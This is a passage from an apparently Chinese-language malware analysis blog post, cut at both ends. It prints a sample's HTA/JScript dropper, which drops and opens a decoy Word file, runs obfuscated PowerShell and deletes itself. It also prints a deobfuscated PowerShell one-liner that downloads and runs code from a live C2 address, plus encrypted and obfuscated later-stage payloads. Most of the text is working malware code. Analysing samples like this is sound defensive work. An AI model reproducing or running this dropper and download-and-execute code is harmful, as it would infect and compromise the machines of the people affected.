&#x27;jec&#x27;,&#x27;Ob&#x27;),(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f&#x27;Ne&#x27;,&#x27;w-&#x27;)) (\&quot;\&quot;\&quot;&#123;0&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;\&quot;\&quot;\&quot;-f (\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;W&#x27;,(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot;-f &#x27;Net&#x27;,&#x27;.&#x27;)),&#x27;C&#x27;,&#x27;li&#x27;,&#x27;ent&#x27;,&#x27;eb&#x27;)).(\&quot;\&quot;\&quot;&#123;3&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;ing&#x27;,(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;lo&#x27;,&#x27;wn&#x27;),(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;Str&#x27;,&#x27;ad&#x27;),&#x27;D&#x27;,&#x27;o&#x27;).\&quot;\&quot;\&quot;In`Vo`kE\&quot;\&quot;\&quot;((\&quot;\&quot;\&quot;http://45.61.138.170/decide.php\&quot;\&quot;\&quot;))&quot;</span>; ##所执行命令</span><br><span class="line"><span class="keyword">var</span> currentfile = <span class="built_in">decodeURIComponent</span>(<span class="built_in">window</span>.document.location.pathname);</span><br><span class="line"><span class="keyword">var</span> fso = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Shell.Application&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DeleteSelf</span>(<span class="params"></span>) </span>&#123;  ##文件自删除</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">fso.DeleteFile(currentfile);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"><span class="keyword">var</span> deletselfstring = <span class="string">&quot;/c ping 127.0.0.1 -n 1 &amp; DEL \&quot;&quot;</span> + <span class="built_in">window</span>.document.location.pathname + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">shell.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, deletselfstring, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadSelf</span>(<span class="params"></span>) </span>&#123;  ##读取自身文件数据</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">file = fso.GetFile(currentfile);</span><br><span class="line">ln = file.Size;</span><br><span class="line">ts = file.OpenAsTextStream(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">content = ts.Read(ln);</span><br><span class="line">ts.Close();</span><br><span class="line"><span class="keyword">return</span> content;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractRealDocData</span>(<span class="params">content</span>) </span>&#123;  ##提取文件数据</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">tmp = content.split(separator);</span><br><span class="line"><span class="keyword">return</span> tmp[<span class="number">1</span>];</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SaveAndRunDoc</span>(<span class="params">doc</span>) </span>&#123;  ##保存数据到文件</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">savepath = currentfile.split(originalextension).join(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(savepath.indexOf(<span class="string">&quot;Temp1_&quot;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">savepath = fso.GetSpecialFolder(<span class="number">2</span>) + <span class="string">&quot;\\&quot;</span> + fso.GetFilename(savepath);</span><br><span class="line">&#125;</span><br><span class="line">file = fso.CreateTextFile(savepath);</span><br><span class="line">file.Write(doc);</span><br><span class="line">file.Close();</span><br><span class="line">shell.ShellExecute(savepath);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExecutePowershell</span>(<span class="params"></span>) </span>&#123;   ##调用powershell</span><br><span class="line">shell.ShellExecute(<span class="string">&quot;powershell.exe&quot;</span>, toexecute, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Main</span>(<span class="params"></span>) </span>&#123;   ##主函数</span><br><span class="line">SaveAndRunDoc(ExtractRealDocData(ReadSelf()));</span><br><span class="line">ExecutePowershell();</span><br><span class="line">DeleteSelf();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">Main();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.close();<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><ul><li>执行这段脚本，将读取自身的脚本数据然后保存到同名doc文件下，打开该doc文件来欺骗用户并完成自删除，实际上其核心的攻击是执行的一段powershell脚本，这里附一张Process Monitor的进程执行截图。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713172255584.png" alt="image-20200713172255584"></p><ul><li>powershell脚本中使用字符替换来做混淆，整理如下，在测试网络可联通google时将从C2上下载代码并执行</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(!(.(<span class="built_in">Test-Connection</span>) (<span class="string">&quot;google.com&quot;</span>) <span class="literal">-q</span>)) </span><br><span class="line">&#123;</span><br><span class="line">&amp;(<span class="built_in">Start-Sleep</span>) <span class="literal">-s</span> <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line">.(<span class="built_in">iex</span>)(.(<span class="built_in">New-Object</span> net.WebClient)).downloadString.InVokE(<span class="string">&quot;http://45.61.138.170/decide.php&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>C2(<a href="http://45.61.138.170/decide.php)的数据如下，可以看出是一个powershell脚本，并且含有大量的混淆，将该文件下载整理分析">http://45.61.138.170/decide.php)的数据如下，可以看出是一个powershell脚本，并且含有大量的混淆，将该文件下载整理分析</a></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713174457688.png" alt="image-20200713174457688"></p><ul><li>代码如下，其功能为：使用powershell中的安全字符串，解密已经被加密好的数据</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$5Kp</span> =  [<span class="type">TyPe</span>](<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;1&#125;&#123;5&#125;&#123;4&#125;&#123;0&#125;&quot;</span><span class="operator">-F</span><span class="string">&#x27;VIceS.mARSHaL&#x27;</span>,<span class="string">&#x27;iNTe&#x27;</span>,<span class="string">&#x27;ruNtiMe&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;Opser&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);  &amp;amp;</span><br><span class="line">(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;voKe&#x27;</span>,<span class="string">&#x27;XPre&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>,<span class="string">&#x27;iN&#x27;</span>,<span class="string">&#x27;sSion&#x27;</span>) <span class="comment">#iex</span></span><br><span class="line">((  ( <span class="built_in">GEt-VariABlE</span>  (<span class="string">&#x27;5K&#x27;</span>+<span class="string">&#x27;P&#x27;</span>)).ValuE::<span class="string">&quot;p`Trtos`TRINgA`NsI&quot;</span>(  ( <span class="built_in">lS</span>  (<span class="string">&quot;V&quot;</span>+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;riABl&quot;</span>+<span class="string">&quot;E:5Kp&quot;</span>) ).ValuE::(<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;NGtO&#x27;</span>,<span class="string">&#x27;locanSi&#x27;</span>,<span class="string">&#x27;GlObAlAl&#x27;</span>,<span class="string">&#x27;TrI&#x27;</span>,<span class="string">&#x27;secUrEs&#x27;</span>).Invoke( <span class="variable">$</span>((<span class="string">&quot;&#123;28&#125;&#123;11&#125;&#123;33&#125;&#123;3&#125;&#123;17&#125;&#123;24&#125;&#123;6&#125;&#123;22&#125;&#123;9&#125;&#123;21&#125;&#123;1&#125;&#123;20&#125;&#123;31&#125;&#123;7&#125;&#123;2&#125;&#123;32&#125;&#123;16&#125;&#123;35&#125;&#123;12&#125;&#123;34&#125;&#123;19&#125;&#123;4&#125;&#123;10&#125;&#123;14&#125;&#123;0&#125;&#123;5&#125;&#123;26&#125;&#123;8&#125;&#123;29&#125;&#123;23&#125;&#123;36&#125;&#123;18&#125;&#123;13&#125;&#123;27&#125;&#123;15&#125;&#123;25&#125;&#123;37&#125;&#123;30&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ADMAYQBiAGIANQBkADAANQA2ADkAOABkAGEAMAA1ADgAYgAxADUANAAzAGYAYwBhADIAOAAzADgAMQAzADgAOAA5AGQAMwBmAGMAYgA5ADEAZgBiAGEAYQA1ADgAMQAwADUAOABlAGMAOAA4ADQAZQBkAGEAZABlADYAYgA4ADMAZgBiAGIANwA0ADAANwBjADIANgA5ADcAZgAwADEAYQA4ADYANQA2ADUAYQBhAGQAYwBmAGMANgA2ADkAMwA2ADcANQAwAGQAZQBiAGUAOQAzAGQAOQAyAGIAZQBiADkAYwAzAGIAZAA3ADkAOQA1ADMAMQA5ADUAMgAxAGIAMgA2AGUAMQBlAGUAZAAyADMAOQAxADgANQBjAGMAYwA2AGEAOQA5ADkAMwBjADcAMwA0AGYANQAyADYAMQBmADgAYgBmADEANwA0AGYAYgA4AGIAMQA2AGUAZgBkAGMAOAA0AGQAMABjADAAOQBiAGEANwBiAGUAMwBlADgANwA4ADQANgA1ADUANABhAGEANQBmADMAZQBhADcAYwBjAGIANwBjA.....(省略后续数据)&#x27;</span>)|&amp;amp;(<span class="string">&quot;&#123;2&#125;&#123;4&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;cUres&#x27;</span>,<span class="string">&#x27;vERtt&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;O-Se&#x27;</span>,<span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;TRing&#x27;</span>)  <span class="literal">-K</span>  <span class="number">183</span>,<span class="number">152</span>,<span class="number">180</span>,<span class="number">14</span>,<span class="number">142</span>,<span class="number">135</span>,<span class="number">92</span>,<span class="number">101</span>,<span class="number">124</span>,<span class="number">195</span>,<span class="number">69</span>,<span class="number">160</span>,<span class="number">230</span>,<span class="number">251</span>,<span class="number">217</span>,<span class="number">167</span>,<span class="number">15</span>,<span class="number">114</span>,<span class="number">183</span>,<span class="number">165</span>,<span class="number">92</span>,<span class="number">54</span>,<span class="number">231</span>,<span class="number">228</span>) ) ) ))</span><br></pre></td></tr></table></figure><ul><li>从代码中发现有invoke-expression，其功能和iex相同，都能执行一段ps脚本，所以直接在命令窗口中输出解密后的数据：</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713181913367.png" alt="image-20200713181913367"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>  <span class="number">80</span>g ( [<span class="type">TyPe</span>](<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;SYs&#x27;</span>,<span class="string">&#x27;tEM&#x27;</span>,<span class="string">&#x27;verT&#x27;</span>,<span class="string">&#x27;.cOn&#x27;</span>) ) ;    <span class="built_in">SET-item</span> (<span class="string">&#x27;Var&#x27;</span>+<span class="string">&#x27;iABLe:&#x27;</span>+<span class="string">&#x27;86f&#x27;</span>)  (  [<span class="type">tyPe</span>](<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;iO.&#x27;</span>,<span class="string">&#x27;N.coMPreSSi&#x27;</span>,<span class="string">&#x27;CO&#x27;</span>,<span class="string">&#x27;MPressIO&#x27;</span>,<span class="string">&#x27;MO&#x27;</span>,<span class="string">&#x27;DE&#x27;</span>)  );  <span class="built_in">Set</span> (</span><br><span class="line"><span class="string">&#x27;16&#x27;</span>+<span class="string">&#x27;7u&#x27;</span>+<span class="string">&#x27;2X&#x27;</span>) ( [<span class="type">TYPe</span>](<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;5&#125;&#123;6&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;m.&#x27;</span>,<span class="string">&#x27;t.En&#x27;</span>,<span class="string">&#x27;YSTe&#x27;</span>,<span class="string">&#x27;Tex&#x27;</span>,<span class="string">&#x27;cO&#x27;</span>,<span class="string">&#x27;DinG&#x27;</span>)  )  ;  .( <span class="variable">$</span>&#123;s`He`lLiD&#125;[<span class="number">1</span>]+<span class="variable">$</span>&#123;ShE`lLid&#125;[<span class="number">13</span>]+<span class="string">&#x27;X&#x27;</span>)(.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;NeW&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;-ObjeC&#x27;</span>) (<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;e</span></span><br><span class="line"><span class="string">AMReADE&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;sy&#x27;</span>,<span class="string">&#x27;SteM.IO.S&#x27;</span>,<span class="string">&#x27;tr&#x27;</span>)(( &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;je&#x27;</span>,<span class="string">&#x27;NeW-Ob&#x27;</span>,<span class="string">&#x27;Ct&#x27;</span>)  (<span class="string">&quot;&#123;8&#125;&#123;2&#125;&#123;10&#125;&#123;0&#125;&#123;3&#125;&#123;4&#125;&#123;9&#125;&#123;5&#125;&#123;6&#125;&#123;1&#125;&#123;7&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;.compRE&#x27;</span>,<span class="string">&#x27;Es&#x27;</span>,<span class="string">&#x27;.I&#x27;</span>,<span class="string">&#x27;sS&#x27;</span>,<span class="string">&#x27;io&#x27;</span>,<span class="string">&#x27;.DeF&#x27;</span>,<span class="string">&#x27;laT&#x27;</span>,<span class="string">&#x27;treAm&#x27;</span>,<span class="string">&#x27;SysteM&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>)( [<span class="type">sYSTeM.Io.mE</span></span><br><span class="line"><span class="type">mORYsTREam</span>]  ( <span class="built_in">gCI</span> vaRIAbLe:<span class="number">80</span>G  ).<span class="string">&quot;vaL`UE&quot;</span>::(<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;4&#125;&#123;0&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;tr&#x27;</span>,<span class="string">&#x27;fromBaS&#x27;</span>,<span class="string">&#x27;Ing&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;64S&#x27;</span>).Invoke( (<span class="string">&quot;&#123;32&#125;&#123;3&#125;&#123;63&#125;&#123;22&#125;&#123;30&#125;&#123;89&#125;&#123;103&#125;&#123;68&#125;&#123;1&#125;&#123;57&#125;&#123;79&#125;&#123;67&#125;&#123;34&#125;&#123;18&#125;&#123;14&#125;&#123;64&#125;&#123;7&#125;&#123;62&#125;&#123;100&#125;&#123;21&#125;&#123;69&#125;&#123;74&#125;&#123;41&#125;&#123;</span></span><br><span class="line"><span class="string">85&#125;&#123;53&#125;&#123;95&#125;&#123;93&#125;&#123;16&#125;&#123;44&#125;&#123;104&#125;&#123;8&#125;&#123;45&#125;&#123;38&#125;&#123;59&#125;&#123;116&#125;&#123;84&#125;&#123;82&#125;&#123;49&#125;&#123;107&#125;&#123;27&#125;&#123;5&#125;&#123;60&#125;&#123;55&#125;&#123;61&#125;&#123;4&#125;&#123;33&#125;&#123;48&#125;&#123;29&#125;&#123;88&#125;&#123;75&#125;&#123;71&#125;&#123;90&#125;&#123;50&#125;&#123;0&#125;&#123;15&#125;&#123;58&#125;&#123;113&#125;&#123;2&#125;&#123;20&#125;&#123;17&#125;&#123;115&#125;&#123;78&#125;&#123;39&#125;&#123;10&#125;&#123;109&#125;&#123;81&#125;&#123;24&#125;&#123;98&#125;&#123;54&#125;&#123;118&#125;&#123;114&#125;&#123;91&#125;&#123;</span></span><br><span class="line"><span class="string">117&#125;&#123;111&#125;&#123;70&#125;&#123;80&#125;&#123;23&#125;&#123;108&#125;&#123;97&#125;&#123;77&#125;&#123;42&#125;&#123;19&#125;&#123;101&#125;&#123;9&#125;&#123;87&#125;&#123;96&#125;&#123;51&#125;&#123;46&#125;&#123;76&#125;&#123;86&#125;&#123;112&#125;&#123;56&#125;&#123;105&#125;&#123;37&#125;&#123;31&#125;&#123;25&#125;&#123;94&#125;&#123;11&#125;&#123;40&#125;&#123;36&#125;&#123;47&#125;&#123;99&#125;&#123;13&#125;&#123;35&#125;&#123;72&#125;&#123;52&#125;&#123;110&#125;&#123;66&#125;&#123;73&#125;&#123;6&#125;&#123;102&#125;&#123;12&#125;&#123;106&#125;&#123;65&#125;&#123;43&#125;&#123;83&#125;&#123;26&#125;&#123;28&#125;&#123;92&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">MMe0WbO66rJIN8mS5l&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;hpAWVWWz6TzvgF/2lVpLbq6rIJkZenEHm+rNVR8xFp3j1QjX6vaLTbXdQ8c9Nwf&#x27;</span>,<span class="string">&#x27;7Ze&#x27;</span>,<span class="string">&#x27;ZZ7lcYHOVs9k6R/j4NkgWS4qD2hT97ybnQ&#x27;</span>,<span class="string">&#x27;q7BXPqEzwjl4CNkV2XkUd3RGjh&#x27;</span>,<span class="string">&#x27;nbx/DZByc6QYmU866IhjSOcdmjrqeI&#x27;</span>,<span class="string">&#x27;9fH</span></span><br><span class="line"><span class="string">VM86ImNaE/CG1FMvGa+TRrtNazZBUHelBM+pLMX&#x27;</span>,<span class="string">&#x27;GU3Ayd0J+HMw/cstjt/L0zV22dvb36RgZjzb2IQ7ffLzdxTnFnOXtquR3cYyJ4vdD8jooYxpSXcSrdVUhm4X7qsMHc9I6eeYF+wRQpw8DfE51BpNK35KHmW91&#x27;</span>,<span class="string">&#x27;ENd5jEGc1NTUoMLPc&#x27;</span>,<span class="string">&#x27;fEt1zvrs7PR&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Ea40e0WjX4LaYRbnb5AwDDzDMyif7vdL&#x27;</span>,<span class="string">&#x27;lVrKITk8l0N2Ck6ibxpHBrU&#x27;</span>,<span class="string">&#x27;TsjA50nqS+LQmPX0ZwxIwqGySrXx+/3VlcTMAI9BvkLuI5rzMy37CmRqmA6obOLhqJlPvrCra6cA251KWo/VXR5/AZiuJ3jwp08mWRF+UY2z&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;6eRhjmyxDZmRDkBqI8UUAt</span></span><br><span class="line"><span class="string">nVr1lg1927pgTuCl9OuigRnz&#x27;</span>,<span class="string">&#x27;yf&#x27;</span>,<span class="string">&#x27;0cpj/Ami&#x27;</span>,<span class="string">&#x27;47NQc7RRantH5U&#x27;</span>,<span class="string">&#x27;aCzI6KnYFZAjd9uIgWXBAf+YsSxl&#x27;</span>,<span class="string">&#x27;PG1+HbE/IihXy/CsTKilhOHujJjr089dDSu9G6KXoE5eQXNlaSi5IyjMvfgCFLf4+H6lIe5cLc&#x27;</span>,<span class="string">&#x27;6+Oiw1Eq3E9apy4q0WJEOT&#x27;</span>,<span class="string">&#x27;TYz39t</span></span><br><span class="line"><span class="string">2xCR&#x27;</span>,<span class="string">&#x27;A5J9lTFs1yuYDzIqQEnNIh2RBi2OOyIhNLD3eOa5/lolXqs&#x27;</span>,<span class="string">&#x27;nJtNVAVG6aCTz8sDwfMGTtSpyAtSeuOst3+5tu2WYs&#x27;</span>,<span class="string">&#x27;k9Gfc1SXPxBx6nCzppeqr25xue&#x27;</span>,<span class="string">&#x27;N5pjXKDTdWDcG22P5ibXMjy80F7Th2Pqx2PqQQTH8YQ/I4/X/aOQwTXLTLF61Rf62Wq/</span></span><br><span class="line"><span class="string">KazOLNJLvtJXdofVeJF6jNDgJjzWdsk3DMOOWqgc+G1NKLugyxPnjcMcDbg61cyb9ipwd6ORUfnOBIn44Np4AwfI0F+&#x27;</span>,<span class="string">&#x27;Aym2xFGLPIa5i46Ht8l3s4UWEJtNEn5chj9k27i&#x27;</span>,<span class="string">&#x27;iuQ09kNOv2KsiifxUy5LM3CTBVOVzDxH7f/Z+18RIldGjsHU29OYETZfSgpX&#x27;</span>,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">cWjDjVk4pVq2gqepcIe3V7wZcMWg/BFq&#x27;</span>,<span class="string">&#x27;pOTXKAuruzs1MIbcJIIAdEzWXzv19VNWAc951PoAPd&#x27;</span>,<span class="string">&#x27;DwF4E49MUywYrijww305TbnsX1z7+Rz9aRFPMw4O0lUUM&#x27;</span>,<span class="string">&#x27;fVjxV6NIEv&#x27;</span>,<span class="string">&#x27;0iuwbD&#x27;</span>,<span class="string">&#x27;aS5j47pHda&#x27;</span>,<span class="string">&#x27;8/TRKvE3eBuothE4075G&#x27;</span>,<span class="string">&#x27;0Fppc5usrRmJ/</span></span><br><span class="line"><span class="string">gvkhZh9EVQijv6N2&#x27;</span>,<span class="string">&#x27;8hcYp+KLV4L24IqTtS+tl3sZ9tMGZ1tsWvrqh&#x27;</span>,<span class="string">&#x27;HOfzzE+Uj/vfChTrpL1F2X/&#x27;</span>,<span class="string">&#x27;p0T0CoeADXPrVnKeKkK5VaYmRWeEyyigOkzF5wVGNQG5Sk3d0lOvyfrXbzSKOMq0n&#x27;</span>,<span class="string">&#x27;vq1W62q1auGHDcO0IpILi6jwQI04&#x27;</span>,<span class="string">&#x27;bWKm3XYd3Z&#x27;</span>,<span class="string">&#x27;Rf</span></span><br><span class="line"><span class="string">7/XbLaPjih&#x27;</span>,<span class="string">&#x27;WExPi2lvUs&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;C5PfBiRcuKA5m4XaOCJydOHPm&#x27;</span>,<span class="string">&#x27;uYw4UHjzN/Ryj+LkQCD1&#x27;</span>,<span class="string">&#x27;kflpu5ijFEWShOqRChrPgKE00J+JPyhG0ur6DMAUyJnbJCaZWtk44qVay4LFU6fRpKZgEaqt2QGj90OeZq5kcU4V70WRWDWH/mazK0RXkf44ywXNVmq&#x27;</span>,<span class="string">&#x27;</span></span><br><span class="line"><span class="string">iGkMT&#x27;</span>,<span class="string">&#x27;5GPvrESFOyMupsLhBR+HaeZK6RIhv8KbIkzfXk/jv6H22/mUlwdRQ0DmB&#x27;</span>,<span class="string">&#x27;5ihMUPYt0&#x27;</span>,<span class="string">&#x27;1j&#x27;</span>,<span class="string">&#x27;2mGN2U&#x27;</span>,<span class="string">&#x27;fyhUSSXcgah6&#x27;</span>,<span class="string">&#x27;aXuj&#x27;</span>,<span class="string">&#x27;HN6a4qEt/64A&#x27;</span>,<span class="string">&#x27;WxM3i&#x27;</span>,<span class="string">&#x27;7G9tcJDmYMErAcT2wbZL1z/rHD3so6Xi7Od1uTrabHgkjkUp2FwU/aM9J+ih</span></span><br><span class="line"><span class="string">R2kuAt+Q+bTXxeTiX&#x27;</span>,<span class="string">&#x27;arCUKmKgV/fpeyTN6xNC0bx0zQhqI79Bf67aIpbcptPLjmjl5RdvIU4DyOZoSZC9225jLyBFKL+ZTD37K+90wPV6PeLRrvVb3wu3h01&#x27;</span>,<span class="string">&#x27;xHa5BIDjpe0l8p8lcYYeXkKN3JL77ZCRpn88&#x27;</span>,<span class="string">&#x27;NBtYYLq7kPMFZGu8s61gxzCJzDhP8XJpvr</span></span><br><span class="line"><span class="string">/nWcwxaUihHoRgLEqErOsqMAv8KaaRiZ/uKoBYFFDs+LZU6x+uCYJDrrG+yQ&#x27;</span>,<span class="string">&#x27;DPXwYIsjL1AuSF8EPV6U81REQEqN7n/Ln0SLnP9Dh8LQuYFalhBvzQaW4y6yNR&#x27;</span>,<span class="string">&#x27;sIEG48SZ8anmlw2&#x27;</span>,<span class="string">&#x27;W/+h3553pA8h5gY&#x27;</span>,<span class="string">&#x27;bWh2e+Zgnx49&#x27;</span>,<span class="string">&#x27;xeh&#x27;</span>,<span class="string">&#x27;JB/&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;ux&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;689+U1efUpjlxmOTqJAX6wC/YhE4FLxThNGag68+/fN/PE+/O/qVfzxG6uqdfVaNL7dOSWl22TQw+OTZrdd6HqmNRofP+x&#x27;</span>,<span class="string">&#x27;TedqqhT6&#x27;</span>,<span class="string">&#x27;x3URnq&#x27;</span>,<span class="string">&#x27;re8uH11ciLI&#x27;</span>,<span class="string">&#x27;T0LIYAoYrmWop2g2vS8PSgalKccxcnH&#x27;</span>,<span class="string">&#x27;vogQGl+Z4uIQJWHFOTkOBPZ&#x27;</span>,<span class="string">&#x27;h6i6dQP</span></span><br><span class="line"><span class="string">ssU1znGjHIFkRyWkHPWCAsTrodgh7cm&#x27;</span>,<span class="string">&#x27;4Z10jnENyEnsoje5hKc3gkCnuOP9A3&#x27;</span>,<span class="string">&#x27;fNpsnvQY&#x27;</span>,<span class="string">&#x27;oFoENf4HsC4xZy0lhuMzAdCCDECZj&#x27;</span>,<span class="string">&#x27;UZQ08/XTPf6a45UvM1Iga&#x27;</span>,<span class="string">&#x27;XQwp1jMWfi1BQM7yS&#x27;</span>,<span class="string">&#x27;3SgGQn+kckowYl8YqUIRNU67RaPd7jU+a7/jpLqZpklqq</span></span><br><span class="line"><span class="string">MVVbFKZ00FoUMAkMQbOS&#x27;</span>,<span class="string">&#x27;JAgwbbGPN5kfT2mAuJi&#x27;</span>,<span class="string">&#x27;glK0LH1mZTcpkIX&#x27;</span>,<span class="string">&#x27;mTuA9j&#x27;</span>,<span class="string">&#x27;gqx1GA&#x27;</span>,<span class="string">&#x27;KgZJgMpeNSyWm4YY&#x27;</span>,<span class="string">&#x27;GhOFE2vyOBzYBxv3rGdn&#x27;</span>,<span class="string">&#x27;OegWOl&#x27;</span>,<span class="string">&#x27;1dVVX31V3WJ/008hON&#x27;</span>,<span class="string">&#x27;0dCJRRdc8mvVuEE2wU&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;wcSYZasUPr/AA==&#x27;</span>,<span class="string">&#x27;yzx</span></span><br><span class="line"><span class="string">Lcl5zOV/+A61B87nheA0ScMLkdTp2GSEhUmNpAHX/+OFhFft5mMTCH5kwgEvdscazKzBHE&#x27;</span>,<span class="string">&#x27;CGYbVT/QcLcHjxyvar7gs3WaCCRqDqk/sUfISX2k&#x27;</span>,<span class="string">&#x27;TeT1nI+pETvSAi&#x27;</span>,<span class="string">&#x27;OwVZUfphJs0LT1Eqwk2VTBWwqpK8hEyniEIGIWcwoi&#x27;</span>,<span class="string">&#x27;nfr3BN1Xrx+&#x27;</span>,<span class="string">&#x27;NuJa4oA</span></span><br><span class="line"><span 